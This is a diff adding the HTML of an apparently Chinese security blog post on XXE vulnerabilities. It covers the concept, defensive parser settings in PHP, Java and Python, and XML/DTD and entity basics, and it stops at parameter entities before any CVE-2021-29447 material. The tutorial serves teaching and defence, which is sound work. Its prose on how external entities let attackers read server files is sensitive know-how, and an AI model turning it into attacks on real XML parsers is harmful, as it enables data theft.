@@ -1,0 +1,1078 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="XXEXXE漏洞介绍XXE漏洞（XML External Entity）是一种安全漏洞，出现在使用XML解析器的应用程序中。当应用程序使用XML解析器解析XML文档时，如果未正确配置解析器，攻击者可以通过在XML文档中插入恶意实体来执行攻击。这些实体可以是外部的，允许攻击者读取本地文件、发起远程HTTP请求等操作。 XXE漏洞可能导致敏感数据泄露、服务器端请求伪造（SSRF）、拒绝服务（DoS）等">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞&amp;CVE-2021-29447">
+<meta property="og:url" content="http://example.com/2024/07/23/XXE/index.html">
+<meta property="og:site_name" content="Ry4nnnn">
+<meta property="og:description" content="XXEXXE漏洞介绍XXE漏洞（XML External Entity）是一种安全漏洞，出现在使用XML解析器的应用程序中。当应用程序使用XML解析器解析XML文档时，如果未正确配置解析器，攻击者可以通过在XML文档中插入恶意实体来执行攻击。这些实体可以是外部的，允许攻击者读取本地文件、发起远程HTTP请求等操作。 XXE漏洞可能导致敏感数据泄露、服务器端请求伪造（SSRF）、拒绝服务（DoS）等">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240514103454265.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240514104833279.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240514110653779.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240514113010101.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240514113857159.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240514170545290.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240514170601269.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240515105827333.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240515105850209.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240515111055017.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240515111116572.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520132525607.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520133313856.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520133420767.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520133452570.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520133534244.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520133625958.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520133759361.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520133836977.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240521112259063.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240521112343994.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240521112420150.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520135847575.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520135949018.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520141420348.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520145009840.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520145226805.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520145735082.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520145812864.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520150157047.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520154739952.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240520155144849.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240521160151295.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240521160213958.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240521160301780.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522103047394.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522103059153.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522104031631.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522104125171.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522104253570.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522104452348.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522104854187.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522105449853.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522111529128.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522111600018.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522111739564.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522112752888.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522113014053.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522113214888.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522113553383.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522114603126.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522132603456.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522133710622.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522133825207.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522133858679.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522134535620.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522134904962.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522135140870.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522135433021.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522135535787.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522135738827.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522144223931.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522150247571.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522150646485.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522152708094.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522155324014.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522155253241.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522155349526.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522155439570.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522155528985.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522160356553.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522162251378.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522162528391.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522215644958.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522222102683.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522222028575.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522222624807.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522223249288.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522223719683.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522223651981.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522233619114.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522233822454.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522234511026.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522234359175.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522234419697.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522234936011.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522234920063.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522235852874.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/240522235836708.png">
+<meta property="article:published_time" content="2024-07-23T14:00:00.000Z">
+<meta property="article:modified_time" content="2024-07-23T10:09:39.991Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="vulnerability">
+<meta property="article:tag" content="CVE-2021-29447">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/04/27/file-upload/240514103454265.png">
+  
+  
+  <title>XXE漏洞&amp;CVE-2021-29447 - Ry4nnnn</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"MgDyY5XEdtIKIZHTxzy3GBJV-gzGzoHsz","app_key":"P8Ab9EN1clJmhpYHpamFEiD9","server_url":"https://mgdyy5xe.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ry4nnnn&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/moon.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="XXE漏洞&amp;CVE-2021-29447">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2024-07-23 22:00" pubdate>
+        2024年7月23日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      20k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      169 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XXE漏洞&amp;CVE-2021-29447</h1>
+            
+            <div class="markdown-body">
+              <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>XXE漏洞（XML External Entity）是一种安全漏洞，出现在使用XML解析器的应用程序中。当应用程序使用XML解析器解析XML文档时，如果未正确配置解析器，攻击者可以通过在XML文档中插入恶意实体来执行攻击。这些实体可以是外部的，允许攻击者读取本地文件、发起远程HTTP请求等操作。</p>
+<p>XXE漏洞可能导致敏感数据泄露、服务器端请求伪造（SSRF）、拒绝服务（DoS）等安全问题。攻击者可以利用XXE漏洞来读取服务器上的任意文件，包括配置文件、密码文件等敏感信息，或者利用外部实体发起攻击者控制的HTTP请求。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
+<li><strong>XML文档解析过程</strong>：当应用程序解析XML文档时，它会将XML文档的内容分解为各种元素和属性，并将其转换为应用程序可以处理的数据结构。XML解析器在处理过程中遇到实体引用时，会尝试解析该实体。</li>
+<li><strong>实体引用</strong>：XML文档中的实体引用是一种特殊的语法，用于在XML文档中引用外部资源或实体。一般情况下，实体引用被用来引用XML文档中的内部实体，但XXE漏洞的关键在于可以引用外部实体。</li>
+<li><strong>外部实体</strong>：外部实体是XML文档中的一个实体，它的内容位于XML文档之外，可以是本地文件系统上的文件，也可以是通过网络可访问的资源。攻击者利用XXE漏洞的关键就是通过引用恶意构造的外部实体来执行攻击。</li>
+<li><strong>利用漏洞</strong>：攻击者通过在XML文档中插入恶意的实体引用，可以引用包含敏感信息的本地文件，或者通过HTTP请求引用攻击者控制的远程资源。当应用程序解析XML文档时，如果未正确防范XXE漏洞，解析器会尝试解析这些外部实体，导致攻击者能够读取敏感信息、发起攻击等。</li>
+</ol>
+<h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><p>为了预防XXE漏洞，应用程序开发者需要采取一些措施，包括：</p>
+<ol>
+<li>禁用或限制解析器的外部实体支持，以防止攻击者利用外部实体来执行攻击。</li>
+<li>使用安全的XML解析库，这些库可能已经实现了对XXE漏洞的防护措施。</li>
+<li>对用户输入进行严格的验证和过滤，以防止恶意输入进入XML文档。</li>
+<li>限制应用程序对文件系统和网络资源的访问权限，以减少攻击者利用XXE漏洞造成的风险。</li>
+</ol>
+<p>从代码上看，可以利用相关方法禁用外部实体：<br>php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>
+
+<p>java:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span>DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure>
+
+<p>Python:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure>
+
+<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML（可扩展标记语言）是一种用于存储和传输数据的标记语言。它由一系列标签组成，这些标签用于标识数据的结构和含义。XML 的设计目标是提供一种通用的方法来描述和交换结构化的信息，它被广泛应用于各种领域，包括 Web 开发、数据交换、配置文件等。</p>
+<p>XML 文件由标签、元素、属性和文本组成。标签用于定义元素的开始和结束，元素是 XML 数据的基本单元，可以包含其他元素或文本。属性是元素的附加信息，用于提供关于元素的额外描述或设置。文本是元素内的数据内容。</p>
+<p>注意：</p>
+<ul>
+<li>所有 XML 元素都须有关闭标签。</li>
+<li>XML 标签对大小写敏感。</li>
+<li>XML 必须正确地嵌套。</li>
+<li>XML 文档必须有根元素。</li>
+<li>XML 的属性值须加引号。</li>
+</ul>
+<h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD（document type definition）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
+<h3 id="定义方式"><a href="#定义方式" class="headerlink" title="定义方式"></a>定义方式</h3><p>DTD 可被成行地声明于 XML 文档中（内部定义），也可作为一个外部引用。</p>
+<h4 id="内部定义"><a href="#内部定义" class="headerlink" title="内部定义"></a>内部定义</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE bookstore [<br>    &lt;!ELEMENT bookstore (book+)&gt;<br>    &lt;!ELEMENT book (title, author, year, price)&gt;<br>    &lt;!ELEMENT title (#PCDATA)&gt;<br>    &lt;!ELEMENT author (#PCDATA)&gt;<br>    &lt;!ELEMENT year (#PCDATA)&gt;<br>    &lt;!ELEMENT price (#PCDATA)&gt;<br>]&gt;<br>&lt;bookstore&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Harry Potter&lt;/title&gt;<br>        &lt;author&gt;J.K. Rowling&lt;/author&gt;<br>        &lt;year&gt;2005&lt;/year&gt;<br>        &lt;price&gt;29.99&lt;/price&gt;<br>    &lt;/book&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Lord of the Rings&lt;/title&gt;<br>        &lt;author&gt;J.R.R. Tolkien&lt;/author&gt;<br>        &lt;year&gt;1954&lt;/year&gt;<br>        &lt;price&gt;25.00&lt;/price&gt;<br>    &lt;/book&gt;<br>&lt;/bookstore&gt;<br></code></pre></td></tr></table></figure>
+
+<p>DTD 直接嵌入在 XML 文档中，用 <code>&lt;!DOCTYPE&gt;</code> 声明定义了书店的结构。书店包含多个书（book），每本书有标题、作者、出版年份和价格等属性。</p>
+<h4 id="外部引用"><a href="#外部引用" class="headerlink" title="外部引用"></a>外部引用</h4><p>有如下bookstore.dtd文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ELEMENT bookstore (book+)&gt;<br>&lt;!ELEMENT book (title, author, year, price)&gt;<br>&lt;!ELEMENT title (#PCDATA)&gt;<br>&lt;!ELEMENT author (#PCDATA)&gt;<br>&lt;!ELEMENT year (#PCDATA)&gt;<br>&lt;!ELEMENT price (#PCDATA)&gt;<br></code></pre></td></tr></table></figure>
+
+<p>XML 文档可以通过 <code>DOCTYPE</code> 声明引用这个外部的 DTD 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE bookstore SYSTEM &quot;bookstore.dtd&quot;&gt;<br>&lt;bookstore&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Harry Potter&lt;/title&gt;<br>        &lt;author&gt;J.K. Rowling&lt;/author&gt;<br>        &lt;year&gt;2005&lt;/year&gt;<br>        &lt;price&gt;29.99&lt;/price&gt;<br>    &lt;/book&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Lord of the Rings&lt;/title&gt;<br>        &lt;author&gt;J.R.R. Tolkien&lt;/author&gt;<br>        &lt;year&gt;1954&lt;/year&gt;<br>        &lt;price&gt;25.00&lt;/price&gt;<br>    &lt;/book&gt;<br>&lt;/bookstore&gt;<br></code></pre></td></tr></table></figure>
+
+<p>其中，外部引用主要有如下两种形式：</p>
+<ol>
+<li><p><strong>Public Identifier（公共标识符）</strong>：使用公共标识符，例如一个 URL，来标识 DTD 的位置。这种方式允许文档引用一个在网络上公开可用的 DTD。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名 PUBLIC &quot;公共标识符&quot; &quot;系统标识符&quot;&gt;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>System Identifier（系统标识符）</strong>：使用一个系统路径或者 URL 来指定 DTD 的位置。这种方式将 DTD 存储在本地文件系统或者网络上的特定位置。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名 SYSTEM &quot;系统标识符&quot;&gt;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="定义内容"><a href="#定义内容" class="headerlink" title="定义内容"></a>定义内容</h3><p>在dtd中不仅能定义元素，也能定义实体。</p>
+<h4 id="定义元素"><a href="#定义元素" class="headerlink" title="定义元素"></a>定义元素</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE bookstore [<br>    &lt;!ELEMENT bookstore (book+)&gt;<br>    &lt;!ELEMENT book (title, author, year, price)&gt;<br>    &lt;!ELEMENT title (#PCDATA)&gt;<br>    &lt;!ELEMENT author (#PCDATA)&gt;<br>    &lt;!ELEMENT year (#PCDATA)&gt;<br>    &lt;!ELEMENT price (#PCDATA)&gt;<br>]&gt;<br>&lt;bookstore&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Harry Potter&lt;/title&gt;<br>        &lt;author&gt;J.K. Rowling&lt;/author&gt;<br>        &lt;year&gt;2005&lt;/year&gt;<br>        &lt;price&gt;29.99&lt;/price&gt;<br>    &lt;/book&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Lord of the Rings&lt;/title&gt;<br>        &lt;author&gt;J.R.R. Tolkien&lt;/author&gt;<br>        &lt;year&gt;1954&lt;/year&gt;<br>        &lt;price&gt;25.00&lt;/price&gt;<br>    &lt;/book&gt;<br>&lt;/bookstore&gt;<br></code></pre></td></tr></table></figure>
+
+<p>DTD 声明了一个名为 <code>bookstore</code> 的元素，它包含了至少一个 <code>book</code> 元素，其中每个 <code>book</code> 元素必须包含 <code>title</code>、<code>author</code>、<code>year</code> 和 <code>price</code> 四个子元素。</p>
+<h4 id="定义实体"><a href="#定义实体" class="headerlink" title="定义实体"></a>定义实体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test [<br>    &lt;!ENTITY authorName &quot;J.K. Rowling&quot;&gt;<br>    &lt;!ENTITY author SYSTEM &quot;author.txt&quot;&gt;<br>]&gt;<br>&lt;test&gt;<br>    &lt;author&gt;&amp;authorName;&lt;/author&gt;<br>    &lt;book&gt;<br>        &lt;title&gt;Harry Potter&lt;/title&gt;<br>        &lt;author&gt;&amp;author;&lt;/author&gt;<br>        &lt;year&gt;2005&lt;/year&gt;<br>        &lt;price&gt;29.99&lt;/price&gt;<br>    &lt;/book&gt;<br>&lt;/test&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这里DTD 声明了两个实体：<code>authorName</code> 和 <code>author</code>。</p>
+<p><code>authorName</code> 实体是一个内部实体，其值为 “J.K. Rowling”。</p>
+<p><code>author</code> 实体是一个外部实体，其内容来自外部文件 <code>author.txt</code>。</p>
+<p>XML 文档中的 <code>&lt;author&gt;</code> 元素引用了这两个实体，<code>&amp;authorName;</code> 引用了内部实体，而 <code>&amp;author;</code> 引用了外部实体。</p>
+<h2 id="实体类型"><a href="#实体类型" class="headerlink" title="实体类型"></a>实体类型</h2><p>除了上面提到的不同的定义方式和定义的内容，实体也有如下3种类型。</p>
+<h4 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h4><p>通用实体用于在XML文档中引用任意的文本片段，类似于变量。</p>
+<p>通用实体通过<code>&lt;!ENTITY&gt;</code>声明，通过<code>&amp;实体名;</code>来引用通用实体。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名 [<br>    &lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;<br>]&gt;<br>&lt;根元素名&gt;<br>    &amp;实体名;<br>&lt;/根元素名&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>参数实体主要用于在DTD中模块化和重用实体定义。</p>
+<p>参数实体通过<code>&lt;!ENTITY %&gt;</code>声明，在DTD中引用参数实体时，同样使用<code>%</code>符号。</p>
